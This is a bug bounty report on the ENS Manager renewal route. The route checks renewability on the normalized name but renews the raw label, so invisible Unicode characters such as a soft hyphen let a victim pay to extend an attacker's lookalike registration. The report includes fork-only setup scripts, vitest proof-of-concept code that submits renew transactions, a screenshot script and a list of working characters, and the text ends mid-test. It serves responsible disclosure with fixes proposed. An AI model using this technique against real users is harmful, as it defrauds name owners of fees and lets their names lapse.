# 90163 w a critical manager renewal route proves renewability from the normalized name but renews the raw label so a user pays to extend an attacker s registration

**Submitted on Aug 23rd 2026 at 11:58:35 UTC by @br0nz3p1ck4x3 for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #90163
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/manager>
* **Impacts:**
  * Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient, such as: - resolving or rendering an ENS name to an attacker-controlled address - showing the wrong recipient or amount on a transaction the user then approves

## Description

## Summary

The Manager's renewal route `/renew/$name` resolves one page from two different names.

* Protocol, expiry, grace-period status and the "expiring on" date are resolved from `ens_normalize(urlParam)`.
* The `label` that becomes the `ETHRegistrar.renew(...)` argument, and the `<h1>` heading, are `urlParam.trim().toLowerCase()` with no ENS normalization.

ENS normalization deletes several characters that `toLowerCase()` leaves intact. `vita<U+00AD>lik.eth` normalizes to `vitalik.eth` while remaining a distinct on-chain label, and the v2 `ETHRegistrar` registers and renews that label verbatim with no character validation.

The result is a renewal page served by the real ENS Manager whose heading reads as the victim's name, whose "expiring on" date is the victim's genuine on-chain expiry, and whose Renew button submits an approve plus `renew()` that extends an attacker-owned label instead. The victim pays, and their own name is not extended.

***

## Impact

An attacker registers one unnormalized variant of a target name, then gets the victim to open `/renew/<variant>.eth`. Every trust signal on the page comes from the genuine name:

| Shown to the user                                      | Source                                          |
| ------------------------------------------------------ | ----------------------------------------------- |
| `<h1>` heading, reads as the victim's name             | raw label                                       |
| "expiring on ", the victim's real expiry               | normalized name                                 |
| new expiry preview = real expiry + duration            | normalized name                                 |
| price                                                  | raw label (same tier, so identical in practice) |
| route did not error, so the name is "v2 and renewable" | normalized name                                 |

The user approves USDC and signs `renew()`. The transaction succeeds. The attacker's registration gains a full year. The victim's name gains nothing, keeps its original expiry, and if it was near expiry it lapses on schedule while the user believes it is renewed.

Cost to the attacker is one ordinary registration per name squatted. Every `.eth` name is exposed.

***

## Root cause

The loader computes two different names from the same route param and never reconciles them.

Normalized branch (decides whether the page renders at all, and what date it shows):

| File:line                                                        | Code                                                                                              |
| ---------------------------------------------------------------- | ------------------------------------------------------------------------------------------------- |
| `apps/manager/src/routes/renew/$name.tsx:26-28`                  | `await queryClient.ensureQueryData(profileExpiryQuery(name))`                                     |
| `apps/manager/src/features/profile/service/profileExpiry.ts:77`  | `const ethName = normalizeEth2LdName(name)`                                                       |
| `apps/manager/src/features/profile/service/profileName.ts:18`    | `normalized = normalize(name)` (`normalize` from `viem/ens`, ENSIP-15 / `@adraffy/ens-normalize`) |
| `apps/manager/src/features/profile/service/profileExpiry.ts:105` | `ensjsv2_getExpiry(client, { name: ethName.name, ... })`                                          |

Raw branch (becomes the transaction argument and the heading):

| File:line                                                       | Code                                                                         |
| --------------------------------------------------------------- | ---------------------------------------------------------------------------- |
| `apps/manager/src/routes/renew/$name.tsx:20`                    | `const parsedName = parseRenewableName(name)`                                |
| `apps/manager/src/features/renew/utils/renewableName.ts:26`     | `parseName(name).andThen(...)`                                               |
| `apps/manager/src/features/register-v2/utils/name-parser.ts:46` | `const normalized = name.trim().toLowerCase()`                               |
| `apps/manager/src/features/register-v2/utils/name-parser.ts:11` | \`INVALID\_LABEL\_CHARS = /\[&\*@#$%^()\[]{}                                 |
| `apps/manager/src/routes/renew/$name.tsx:61-62`                 | `label: parsedName.value.label,` next to `currentExpiry: expiryData.expiry,` |

`grep -rn "normalize" apps/manager/src/features/renew/` returns zero hits. Nothing in the renewal feature canonicalizes.

### Raw label to calldata

| Hop                          | File:line                                                                                                                |
| ---------------------------- | ------------------------------------------------------------------------------------------------------------------------ |
| loader returns the raw label | `routes/renew/$name.tsx:61`                                                                                              |
| passed into the renewal UI   | `features/renew/workflow/RenewalPage.tsx:22-26`                                                                          |
| user confirms                | `features/renew/workflow/pricing/components/ConfirmPurchase.tsx:64` `type: 'renewal.start', label`                       |
| stored on the machine        | `features/renew/state/renewalUi.machine.ts:151`                                                                          |
| handed to the submit actor   | `features/renew/state/renewalUi.machine.ts:349` `label: submission.label`                                                |
| encoded                      | `packages/transaction-manager/src/machines/registration/registration.actors.ts:1072` `encodeRenewData(input.label, ...)` |
| calldata                     | `registration.actors.ts:1025-1030` `const cleanLabel = label.replace('.eth', '')` then `functionName: 'renew'`           |

### Gates that pass because they run on the other name

* `routes/renew/$name.tsx:30-50`: protocol must be `v2` and not past grace. Both come from `expiryData`, which is the normalized name's.
* `routes/renew/$name.tsx:52` `canRenewV2Name(name, expiryDate)`: the only syntax test is `features/grace/utils/gracePeriod.ts:48` `/^[^.]+\.eth$/`, which the raw label passes; the window test uses the normalized name's `expiryDate`.
* There is no `params.parse` on this route. The profile route has one (`routes/$name/route.tsx:4-13`), weak as it is.
* The "you are renewing someone else's name" dialog is not on this route. `ThirdPartyRenewalDialog` is referenced only from `features/profile/components/view/ProfileRenewAction.tsx:68`. Direct navigation to `/renew/$name` shows no ownership warning at all.

### The Explorer's renewal builder normalizes; the Manager's does not

`apps/portal/src/features/renew/hooks/useRenewalTransactions.ts:191-197` builds the same `renew()` call and canonicalizes first, with the reason in a comment:

```tsx
// ensjs splits the label without normalizing, so pass a normalized 2LD name.
const writeParams = renewNameWriteParameters(publicClient, {
  name: `${getLabel(params.name)}.eth`,
  ...
})
```

`getLabel` (`apps/portal/src/utils/token/getLabel.ts:10-20`) is `ens_split(ens_normalize(name))[0]`. The Manager's equivalent, `registration.actors.ts:1025`, is `label.replace('.eth', '')` on a string that was only lowercased. The project already knows the label must be normalized before it becomes calldata; the Manager's v2 renew path is the one place that does not do it.

### The v1 sibling route does the check this one omits

`apps/manager/src/features/renew/data/queries/v1Renewable.query.ts:26-28` calls `ensjsIsRenewable(client, { renewerAddress, label: parsedName.value.label })` with the raw label, so the v1 path validates on-chain the exact label it is about to renew. The v2 path performs no on-chain check of its label. The asymmetry is inside the same feature directory.

***

## Which characters produce the split

Executed against the app's own two functions (see Part A below).

| Input label                                     | `parseName().label` (transaction) | `normalizeEth2LdName()` (gate) | Split |
| ----------------------------------------------- | --------------------------------- | ------------------------------ | ----- |
| `vita<U+00AD>lik.eth` soft hyphen               | `vita<U+00AD>lik`                 | `vitalik`                      | yes   |
| `vita<U+200B>lik.eth` zero width space          | `vita<U+200B>lik`                 | `vitalik`                      | yes   |
| `vitalik<U+FE0F>.eth` variation selector 16     | `vitalik<U+FE0F>`                 | `vitalik`                      | yes   |
| `vitalik<U+FE00>.eth` variation selector 1      | `vitalik<U+FE00>`                 | `vitalik`                      | yes   |
| `vitalik<U+180B>.eth` Mongolian FVS1            | `vitalik<U+180B>`                 | `vitalik`                      | yes   |
| `vita<U+034F>lik.eth` combining grapheme joiner | `vita<U+034F>lik`                 | rejected                       | no    |
| `Vitalik.eth`                                   | `vitalik`                         | `vitalik`                      | no    |

The case-only variant does not work here, unlike on the profile route, because `parseName` lowercases. The attack requires a character that ENS normalization deletes and that `toLowerCase()` plus `INVALID_LABEL_CHARS` leave intact. U+00AD and U+200B are the practical choices; U+200B renders as nothing in every layout, U+00AD paints a hyphen only if a line break lands exactly on it.

***

## Preempting the likely closure arguments

Out of scope: "Reflected plain text injection (e.g. url parameters, path, etc.)" Nothing is injected. The URL param is not reflected as content, it is used as an on-chain lookup key and as an ABI argument. The harm is the label inside a signed transaction, not the rendered text.

Out of scope: "Theoretical impacts without any proof or demonstration" Both halves are executed above on a local fork: the app's own two functions produce different labels for one URL, and the resulting `renew()` extends the attacker's registration by exactly one year while the proved name gains zero.

Out of scope: "Impacts caused by vulnerabilities requiring un-prompted, in-app user actions that are not part of the normal app workflows" The only actions are opening a renewal page and clicking Renew, which is the flow the route exists for. No settings change, no debug route, no unusual interaction.

Prohibited activity: "Attempting phishing or other social engineering attacks against our employees and/or customers" That clause governs conduct during testing. The PoC uses two self-owned names on a local fork and touches nobody. The program lists "Causing the application to display or pre-fill an incorrect ... transaction detail, so that a user ... submits a transaction to an unintended recipient" as a Critical impact, which presumes a user who arrives at a page and trusts what it shows. The deception here is performed by the application, which renders the genuine name's expiry beside a transaction for a different label.

"It's just a homograph." There is no lookalike character to spot. U+200B and U+00AD have no glyph. And the page is not merely confusing: it proves renewability against one node and transacts against another. A user who checks the expiry date, the price, and the heading, which is everything the page offers, sees only correct information.

"The user can just renew again, so the loss is one fee." They have no reason to. The success screen is `RenewSuccessStep` (`workflow/result/SuccessStep.tsx:5-12`), which renders `RenewalDetails`, and that component computes the new expiry from `currentExpiry` (`RenewalDetails.tsx:15, 23-32`), the normalized name's genuine expiry. The app therefore tells the victim their name now expires a year later. It does not. They discover it when the name lapses and someone else registers it, which is the loss that matters and is not bounded by the fee. `FailureStep.tsx:30, 37` renders `${label}.eth` from the raw label too, so no screen in the flow ever names the label that was actually renewed.

"The amount is a valueless testnet token." The token is whatever the deployment's payment token is; the defect is that the app charges the user for a name other than the one it validated and displayed. The same code path on a mainnet deployment spends mainnet funds, and the durable harm, a name allowed to lapse while the owner believes it is renewed, is denominated in the name, not the fee.

"Anyone can renew anyone's name, that's normal."" Correct, and irrelevant. The defect is that the app told the user this was their name, in its renewal window, expiring on their date, and then charged them for a different one. The route has no owner check and no third-party warning, and the v1 sibling route validates the raw label on-chain while this one does not.

***

## Not a duplicate

EXP-INPUT-005 (nearest known issue): "ENS name validators accept inputs that ENS normalization later rejects or transforms ... The practical impact is homograph-style display confusion in our UI rather than incorrect resolution."

* Different root cause. EXP-INPUT-005 is validator leniency. This is a divergence between two sibling lookups inside one route loader: the eligibility gate, the protocol check, the grace window and the displayed expiry all run on `normalize(param)` while the transaction and the heading run on `trim().toLowerCase()(param)`.
* Different impact, and the one EXP-INPUT-005 explicitly excludes. Not display confusion, but a transaction executed against a different on-chain label with the user's funds. The BBP rules keeps this eligible even on the harshest reading: "new consequences of a listed root cause that materially change its severity" are in scope.
* The EXP-INPUT-005 fix does not fix this. Tightening `parseName`'s character list is not the same as making the renew route transact on the node it proved. The correct fix is to canonicalize the param once in the loader.

QA-03: "a mismatch between the displayed total and the amount actually charged on-chain would be a new finding." This is worse than a total mismatch: the wrong name is charged for. QA-03 is also Explorer-only.

QA-05 / WEB-626 / WEB-1304 / WEB-1255: functional renewal defects (renew blocked after registration, misleading grace modal, stale wrapper expiry, grace helpers keyed on a boolean). None touches which label is renewed.

Relationship to the pre-existing `/$name` profile finding: same abstract family (the app mixes raw and normalized forms of the URL name param), different files, different sink, disjoint fixes. That one is `profileRecords.ts` / `profileEthAddress.ts` / `profileAvatar.ts` on the profile route, sink is a rendered and copyable address record. This one is `parseName` / `parseRenewableName` on `/renew/$name`, sink is `ETHRegistrar.renew()` calldata. Adding `normalize()` to `profileRecords.ts` changes nothing here; normalizing `parseName` changes nothing there. It also reproduces with a plain URL and no profile page involved.

***

## Recommendation

1. Canonicalize at the boundary. In the `/renew/$name` loader, compute `normalize(name)` once, `redirect()` to the canonical URL when it differs, and derive both the gate and the `label` from that single value.
2. Fail closed when the param does not normalize, rather than falling through to the raw form.
3. Validate the label on-chain before transacting, as the v1 route already does (`v1Renewable.query.ts:26-28`).
4. Add an invariant test asserting that the label passed to `encodeRenewData` equals `normalize(routeParam)`'s label for every input the route accepts.
5. Apply the same canonicalization to the other places that carry the raw param into state: `addFavorite`, the notification payload name, and search history.

***

## Proof of Concept

## Proof of Concept

All of this was executed against a local Anvil fork of Sepolia. No live network was touched.

### Environment

```bash
docker compose -f e2e/infra/docker-compose.yml up -d   # Anvil fork of Sepolia on 127.0.0.1:8545
cast chain-id --rpc-url <http://127.0.0.1:8545>          # 11155111
```

Contracts read from `@ensdomains/ensjs/chain` (`ensL1Contracts[sepolia]`):

```
ETHRegistrar  0xa88553F454b77203B0D036A05c894d555EAAa2Cc
ETHRegistry   0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2
MockUSDC      0x768F42455A2D082E23ceeF7d51e5787C82d67a39
```

### Setup: register both names on the fork

`.poc-setup.sh`, run from the repo root:

```bash
#!/usr/bin/env bash
# Fork-only PoC setup: registers the victim's real name and the attacker's lookalike.
set -euo pipefail
R=http://127.0.0.1:8545
REGISTRAR=0xa88553F454b77203B0D036A05c894d555EAAa2Cc
USDC=0x768F42455A2D082E23ceeF7d51e5787C82d67a39
FUNDER_KEY=0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80
FUNDER=0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
VICTIM_KEY=0x1111111111111111111111111111111111111111111111111111111111111111
VICTIM=$(cast wallet address --private-key $VICTIM_KEY)
cast rpc anvil_setCode $VICTIM 0x --rpc-url $R >/dev/null
cast rpc anvil_setBalance $VICTIM 0x21e19e0c9bab2400000 --rpc-url $R >/dev/null
cast send $USDC "mint(address,uint256)" $VICTIM 100000000000 --private-key $FUNDER_KEY --rpc-url $R >/dev/null
ATTACKER=0x00000000000000000000000000000000DeaDBeef
Z=0x0000000000000000000000000000000000000000
ZH=0x0000000000000000000000000000000000000000000000000000000000000000

cast send $USDC "mint(address,uint256)" $FUNDER 100000000000 --private-key $FUNDER_KEY --rpc-url $R >/dev/null
cast send $USDC "approve(address,uint256)" $REGISTRAR 100000000000 --private-key $FUNDER_KEY --rpc-url $R >/dev/null

register () {   # $1 label  $2 owner  $3 duration  $4 secret
  local C
  C=$(cast call $REGISTRAR "makeCommitment(string,address,bytes32,address,address,uint64,bytes32)(bytes32)" "$1" "$2" "$4" $Z $Z "$3" $ZH --rpc-url $R)
  cast send $REGISTRAR "commit(bytes32)" "$C" --private-key $FUNDER_KEY --rpc-url $R >/dev/null
  cast rpc evm_increaseTime 120 --rpc-url $R >/dev/null
  cast rpc evm_mine --rpc-url $R >/dev/null
  cast send $REGISTRAR "register(string,address,bytes32,address,address,uint64,address,bytes32)" "$1" "$2" "$4" $Z $Z "$3" $USDC $ZH --private-key $FUNDER_KEY --rpc-url $R >/dev/null
  echo "registered $(printf '%s' "$1" | xxd -p) -> $2"
}

# The victim's real name, 28 days so it is inside the renewal window.
register "pocvictim" $VICTIM 2419200 0x4444444444444444444444444444444444444444444444444444444444444444
# The attacker's lookalike: the same label with U+00AD (0xC2 0xAD) inserted.
register "$(printf 'pocvict\xc2\xadim')" $ATTACKER 2419200 0x3333333333333333333333333333333333333333333333333333333333333333
```

Output:

```
registered 706f6376696374696d -> 0x000000000000000000000000000000000000AA01
registered 706f6376696374c2ad696d -> 0x00000000000000000000000000000000DeaDBeef
```

Both registrations succeed. The v2 `ETHRegistrar` applies no label normalization and no character validation: it priced, committed and registered the 11-byte label `706f6376696374c2ad696d` exactly like the 9-byte one. This was previously only reasoned from the ABI.

### Part A and B: the split and the on-chain effect, in one test

`apps/manager/.poc/renew-split.test.ts`. It imports the app's own two functions verbatim, so the divergence is the app's, not a re-implementation. Run with `pnpm --filter @ens-apps/manager exec vitest run .poc/renew-split.test.ts --reporter=verbose`.

```tsx
/**
 * PoC - apps/manager `/renew/$name`
 *
 * The route decides renewability + expiry from the ENS-NORMALIZED name, but
 * builds the renewal transaction from a label that is only `trim().toLowerCase()`d.
 * Both code paths below are imported verbatim from the app source.
 *
 * Runs against the LOCAL Anvil Sepolia fork only (127.0.0.1:8545).
 */
import {
  createPublicClient,
  createWalletClient,
  encodeFunctionData,
  http,
  keccak256,
  parseAbi,
  stringToHex,
} from 'viem'
import { privateKeyToAccount } from 'viem/accounts'
import { sepolia } from 'viem/chains'
import { it } from 'vitest'
import { normalizeEth2LdName } from '@/features/profile/service/profileName'
import { parseName } from '@/features/register-v2/utils/name-parser'

const RPC = '<http://127.0.0.1:8545>'
const REGISTRAR = '0xa88553F454b77203B0D036A05c894d555EAAa2Cc' as const
const REGISTRY = '0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2' as const
const USDC = '0x768F42455A2D082E23ceeF7d51e5787C82d67a39' as const
const ZERO32 =
  '0x0000000000000000000000000000000000000000000000000000000000000000' as const

// What the victim clicks or pastes. There is an invisible U+00AD in the label.
const URL_PARAM = 'pocvict­im.eth'

const registrarAbi = parseAbi([
  'function renew(string label, uint64 duration, address paymentToken, bytes32 referrer)',
  'function getRenewPrice(string label, uint64 duration, address paymentToken) view returns (uint256 price)',
])
const registryAbi = parseAbi(['function getExpiry(uint256 id) view returns (uint64)'])
const erc20Abi = parseAbi([
  'function approve(address,uint256) returns (bool)',
  'function mint(address,uint256)',
])

const canonicalId = (label: string) =>
  BigInt(keccak256(stringToHex(label))) & ~0xffffffffn

const hex = (s: string) => Buffer.from(s, 'utf8').toString('hex')

it('renew route renews a different name than the one it validated', { timeout: 180_000 }, async () => {
  const pub = createPublicClient({ chain: sepolia, transport: http(RPC) })
  const victim = privateKeyToAccount(
    '0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80',
  )
  const wallet = createWalletClient({ account: victim, chain: sepolia, transport: http(RPC) })

  console.log('URL param                  :', JSON.stringify(URL_PARAM), 'hex=', hex(URL_PARAM))

  const parsed = parseName(URL_PARAM)
  if (parsed.isErr()) throw new Error('parseName rejected the input')
  const txLabel = parsed.value.label
  const normalized = normalizeEth2LdName(URL_PARAM)
  if (!normalized) throw new Error('normalizeEth2LdName rejected the input')

  console.log('\n--- the split (app code) ---')
  console.log('parseName().label     (TX)  :', JSON.stringify(txLabel), 'hex=', hex(txLabel))
  console.log('normalizeEth2LdName() (GATE):', JSON.stringify(normalized.label), 'hex=', hex(normalized.label))
  console.log('same label?                 :', txLabel === normalized.label)

  const gateId = canonicalId(normalized.label)
  const txId = canonicalId(txLabel)

  const read = async (id: bigint) =>
    pub.readContract({ address: REGISTRY, abi: registryAbi, functionName: 'getExpiry', args: [id] })

  const beforeGate = await read(gateId)
  const beforeTx = await read(txId)
  console.log('\n--- expiries BEFORE ---')
  console.log('gate name', normalized.name, beforeGate)
  console.log('tx name  ', `${txLabel}.eth`, beforeTx)

  const DURATION = 31_536_000n
  const price = await pub.readContract({
    address: REGISTRAR,
    abi: registrarAbi,
    functionName: 'getRenewPrice',
    args: [txLabel, DURATION, USDC],
  })

  console.log('\nprice charged to the victim:', price.toString(), 'MockUSDC units')

  await wallet.writeContract({ address: USDC, abi: erc20Abi, functionName: 'mint', args: [victim.address, price] })
  await wallet.writeContract({ address: USDC, abi: erc20Abi, functionName: 'approve', args: [REGISTRAR, price] })

  const data = encodeFunctionData({
    abi: registrarAbi,
    functionName: 'renew',
    args: [txLabel, DURATION, USDC, ZERO32],
  })
  console.log('renew calldata             :', `${data.slice(0, 74)}...`)
  const hash = await wallet.sendTransaction({ to: REGISTRAR, data })
  const receipt = await pub.waitForTransactionReceipt({ hash })
  console.log('renew tx                   :', hash, 'status', receipt.status)

  const afterGate = await read(gateId)
  const afterTx = await read(txId)
  console.log('\n--- expiries AFTER ---')
  console.log('gate name', normalized.name, afterGate, 'delta', (afterGate - beforeGate).toString())
  console.log('tx name  ', `${txLabel}.eth`, afterTx, 'delta', (afterTx - beforeTx).toString())
})
```

Actual output:

```
URL param                  : "pocvict­im.eth" hex= 706f6376696374c2ad696d2e657468

--- the split (app code) ---
parseName().label     (TX)  : "pocvict­im" hex= 706f6376696374c2ad696d
normalizeEth2LdName() (GATE): "pocvictim" hex= 706f6376696374696d
same label?                 : false

--- expiries BEFORE ---
gate name pocvictim.eth 1789821676n
tx name   pocvict­im.eth 1789821799n

price charged to the victim: 8000021 MockUSDC units
renew calldata             : 0x89d779c30000000000000000000000000000000000000000000000000000000000000080...
renew tx                   : 0xe40fa7ea902c9b77ec5a9f9ad64d41fb259c5d135f8dcb5e5891db4ff7ec0222 status success

--- expiries AFTER ---
gate name pocvictim.eth 1789821676n delta 0
tx name   pocvict­im.eth 1821357799n delta 31536000
```

Absolute expiry values depend on when the fork was started; the invariant is the two deltas.

The victim's wallet paid 8.000021 USDC. The attacker's label gained 31,536,000 seconds. The name the page proved renewable, whose expiry date the page displayed, gained 0.

The `0x89d779c3` selector is `renew(string,uint64,address,bytes32)`, and the calldata carries `706f6376696374c2ad696d` as the label.

### Character table reproduction

`apps/manager/.poc/chars.test.ts`, same import style:

```tsx
import { it } from 'vitest'
import { normalizeEth2LdName } from '@/features/profile/service/profileName'
import { parseName } from '@/features/register-v2/utils/name-parser'

const CASES: [string, string][] = [
  ['U+00AD soft hyphen', 'vita­lik.eth'],
  ['U+FE0F variation selector-16', 'vitalik️.eth'],
  ['U+FE00 variation selector-1', 'vitalik︀.eth'],
  ['U+180B mongolian FVS1', 'vitalik᠋.eth'],
  ['U+200B zero width space', 'vitalik.eth'],
  ['U+034F combining grapheme joiner', 'vita͏lik.eth'],
  ['ASCII capital', 'Vitalik.eth'],
  ['fullwidth V U+FF36', 'Ｖitalik.eth'],
  ['plain control', 'vitalik.eth'],
]

it('which URL params split the gate from the tx label', () => {
  console.log('label'.padEnd(34), 'parseName(TX)'.padEnd(26), 'normalize(GATE)'.padEnd(16), 'SPLIT?')
  for (const [name, input] of CASES) {
    const p = parseName(input)
    const n = normalizeEth2LdName(input)
    const tx = p.isOk() ? p.value.label : 'REJECTED'
    const gate = n ? n.label : 'REJECTED'
    const split = tx !== 'REJECTED' && gate !== 'REJECTED' && tx !== gate
    console.log(
      name.padEnd(34),
      JSON.stringify(tx).padEnd(26),
      JSON.stringify(gate).padEnd(16),
      split ? 'YES' : 'no',
    )
  }
})
```

Actual output:

```
U+00AD soft hyphen                 "vita­lik"      "vitalik"  SPLIT
U+FE0F variation selector-16       "vitalik️"      "vitalik"  SPLIT
U+FE00 variation selector-1        "vitalik︀"      "vitalik"  SPLIT
U+180B mongolian FVS1              "vitalik᠋"      "vitalik"  SPLIT
U+200B zero width space            "vitalik"      "vitalik"  SPLIT
U+034F combining grapheme joiner   "vita͏lik"      "REJECTED" no
ASCII capital                      "vitalik"       "vitalik"  no
plain control                      "vitalik"       "vitalik"  no
```

### The rendered page, executed

`apps/manager/vite.config.ts:20-25` proxies `/rpc` to the fork. With `apps/manager/.env.local` set to

```
VITE_API_URL=http://127.0.0.1:2999
VITE_SEPOLIA_RPC_URL=/rpc
VITE_SEPOLIA_RPC_URL_SERVER=http://127.0.0.1:8545
VITE_RHINESTONE_ENDPOINT_URL=/orchestrator
VITE_RHINESTONE_CUSTOM_RPC_URLS={"11155111":"<http://127.0.0.1:8545>"}
VITE_INDEXER_GRAPHQL_URL=http://127.0.0.1:5655/graphql
```

run `pnpm --filter @ens-apps/manager exec vite dev --port 3000` and load both URLs:

```
<http://localhost:3000/renew/pocvictim.eth>          # control
<http://localhost:3000/renew/pocvict%C2%ADim.eth>    # attack
```

On-chain state at the time of the capture:

```
pocvictim.eth          (what the page proves)  expiry 1789821676  September 19, 2026
pocvict<U+00AD>im.eth  (what the tx renews)    expiry 1821357799  September 19, 2027
```

Rendered DOM, read out of a headless Chromium:

```
===== control :: /renew/pocvictim.eth
h1     : "pocvictim.eth"     hex= 706f6376696374696d2e657468
text   : pocvictim.eth | 1 year | $8.01/year | ... | Renew to date | September 19, 2027
         | Renewing for | 1 year | expiring on | September 19, 2027 | TOTAL | $8.01

===== attack :: /renew/pocvict%C2%ADim.eth
h1     : "pocvict­im.eth"    hex= 706f6376696374c2ad696d2e657468
text   : pocvict­im.eth | 1 year | $8.01/year | ... | Renew to date | September 19, 2027
         | Renewing for | 1 year | expiring on | September 19, 2027 | TOTAL | $8.01
```

The capture script, `apps/manager/.poc/screenshot.mjs`:

```jsx
/**
 * Renders both renewal URLs against the local fork and writes full-page PNGs.
 *   node apps/manager/.poc/screenshot.mjs
 * Requires: the manager dev server on :3001 and `pnpm exec playwright install chromium`.
 */
import { chromium } from 'playwright'

const OUT = process.env.POC_OUT ?? '/Users/bp/x/ens/poc-shots'
const urls = [
  ['control', '<http://localhost:3000/renew/pocvictim.eth>'],
  ['attack', '<http://localhost:3000/renew/pocvict%C2%ADim.eth>'],
]

const browser = await chromium.launch()
for (const [name, url] of urls) {
  const page = await browser.newPage({ viewport: { width: 1440, height: 1000 } })
  await page.goto(url, { waitUntil: 'networkidle', timeout: 60000 }).catch(() => {})
  await page.waitForTimeout(5000)
  const h1 = await page.locator('h1').first().textContent().catch(() => null)
  const body = await page.locator('body').innerText().catch(() => '')
  await page.screenshot({ path: `${OUT}/${name}.png`, fullPage: true })
  console.log(`\n===== ${name} :: ${url}`)
  console.log('h1  :', JSON.stringify(h1), 'hex=', h1 ? Buffer.from(h1, 'utf8').toString('hex') : null)
  console.log('text:', body.split('\n').map((s) => s.trim()).filter(Boolean).slice(0, 40).join(' | '))
  await page.close()
}
await browser.close()
```

The two full-page screenshots are byte identical:

```
$ shasum -a 256 poc-shots/control.png poc-shots/attack.png
f4f94ddef1ca27b904a86931ad1a3c4591e36ad1bcf5df3e7147a1c48cf39abb  poc-shots/control.png
f4f94ddef1ca27b904a86931ad1a3c4591e36ad1bcf5df3e7147a1c48cf39abb  poc-shots/attack.png
```

Same SHA-256, same 115840 bytes. There is nothing on the page for a user to inspect. The attack page's `<h1>` carries the extra `c2ad` byte pair in the DOM and paints nothing for it.

The date is the proof. The attack page says "Renew to date September 19, 2027" and "expiring on September 19, 2027". That is the victim name's expiry (September 19, 2026) plus one year. The label the transaction actually renews already expires September 19, 2027, so a page derived from the label it transacts on would read September 19, 2028. The displayed date can only have come from the normalized name.

Element sources:

| Element               | File:line                                                                       | Value                             |
| --------------------- | ------------------------------------------------------------------------------- | --------------------------------- |
| `<h1>`                | `features/register-v2/workflow/pricing/components/PricingDomainHeader.tsx:9,29` | reads `pocvictim.eth`             |
| "expiring on "        | `features/renew/workflow/pricing/components/PricingSummaryCard.tsx:10-13,39`    | the victim's genuine expiry       |
| new expiry preview    | `features/renew/workflow/renewing/components/RenewalDetails.tsx:23-32`          | genuine expiry plus duration      |
| ownership warning     | not rendered on this route                                                      | absent                            |
| resulting transaction | `registration.actors.ts:1025-1030`                                              | `renew("pocvict\xc2\xadim", ...)` |

***

## The renewal submitted by the app's own actor

The section above builds the `renew()` call the way the app does. This one hands the work to the app: `submitRenewActor` is the exact actor the renewal machine invokes at `renewalUi.machine.ts:107-109, 341-355`, running through the real `transactionManager` and the real EOA transport. No calldata is written by hand.

`apps/manager/.poc/renew-actor.test.ts`:

```tsx
/**
 * PoC (submit path) - the RENEWAL IS SUBMITTED BY THE APP'S OWN ACTOR.
 *
 * No calldata is hand-built here. `submitRenewActor` is the exported actor the
 * renewal machine invokes at renewalUi.machine.ts:341-355, and it is given the
 * exact `label` the route loader produces for the attack URL.
 *
 * Local Anvil Sepolia fork only.
 */
import {
  transactionManager,
  waitForTransaction,
} from '@ens-apps/transaction-manager'
// The exact module the renewal machine imports it from (renewalUi.machine.ts:7-8).
import { submitRenewActor } from '@ens-apps/transaction-manager/machines/registration/registration.actors'
import { createPublicClient, createWalletClient, http, keccak256, parseAbi, stringToHex } from 'viem'
import { privateKeyToAccount } from 'viem/accounts'
import { sepolia } from 'viem/chains'
import { it } from 'vitest'
import { normalizeEth2LdName } from '@/features/profile/service/profileName'
import { parseName } from '@/features/register-v2/utils/name-parser'

const RPC = '<http://127.0.0.1:8545>'
const REGISTRY = '0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2' as const
const URL_PARAM = 'pocvict­im.eth' // U+00AD inside the label

const registryAbi = parseAbi(['function getExpiry(uint256 id) view returns (uint64)'])
const canonicalId = (label: string) => BigInt(keccak256(stringToHex(label))) & ~0xffffffffn

it('the app actor renews the label the loader produced, not the one it validated', { timeout: 180_000 }, async () => {
  const publicClient = createPublicClient({ chain: sepolia, transport: http(RPC) })
  const victim = privateKeyToAccount('0x1111111111111111111111111111111111111111111111111111111111111111')
  const walletClient = createWalletClient({ account: victim, chain: sepolia, transport: http(RPC) })

  // Exactly what routes/renew/$name.tsx does with params.name.
  const parsed = parseName(URL_PARAM)
  if (parsed.isErr()) throw new Error('parseName rejected the input')
  const loaderLabel = parsed.value.label            // -> RenewalPage label prop (line 61)
  const gate = normalizeEth2LdName(URL_PARAM)       // -> profileExpiryQuery (lines 26-28)
  if (!gate) throw new Error('normalize rejected')

  console.log('URL param        :', JSON.stringify(URL_PARAM))
  console.log('loader label (tx):', JSON.stringify(loaderLabel))
  console.log('gate name        :', JSON.stringify(gate.name))

  const read = (label: string) =>
    publicClient.readContract({
      address: REGISTRY, abi: registryAbi, functionName: 'getExpiry',
      args: [canonicalId(label)],
    })

  const beforeGate = await read(gate.label)
  const beforeTx = await read(loaderLabel)
  console.log('\nBEFORE  gate', gate.name, beforeGate, '| tx', `${loaderLabel}.eth`, beforeTx)

  // The victim's wallet must approve the registrar, exactly as the machine's
  // submittingTokenApproval step does before submitRenewal.
  const erc20 = parseAbi(['function approve(address,uint256) returns (bool)'])
  const approve = await walletClient.writeContract({
    address: '0x768F42455A2D082E23ceeF7d51e5787C82d67a39',
    abi: erc20, functionName: 'approve',
    args: ['0xa88553F454b77203B0D036A05c894d555EAAa2Cc', 100_000_000n],
  })
  await publicClient.waitForTransactionReceipt({ hash: approve })

  const archived: Array<{ txId: string; hash?: string; request?: unknown }> = []
  const off = transactionManager.onTransactionArchived((t) => archived.push(t))

  // The EOA transport passes `from` as a bare address, so viem routes the send
  // to the node for signing, exactly as a browser wallet would. Anvil is put in
  // auto-impersonate mode so it can sign for the victim on the fork.
  await publicClient.request({
    method: 'anvil_autoImpersonateAccount' as never,
    params: [true] as never,
  })

  // THE APP'S OWN ACTOR. Same inputs the machine passes at renewalUi.machine.ts:346-355.
  const result = await submitRenewActor({
    label: loaderLabel,
    duration: 31_536_000n,
    selectedToken: 'USDC',
    signer: { type: 'eoa', walletClient },
    publicClient,
    id: 'poc-renew',
  })
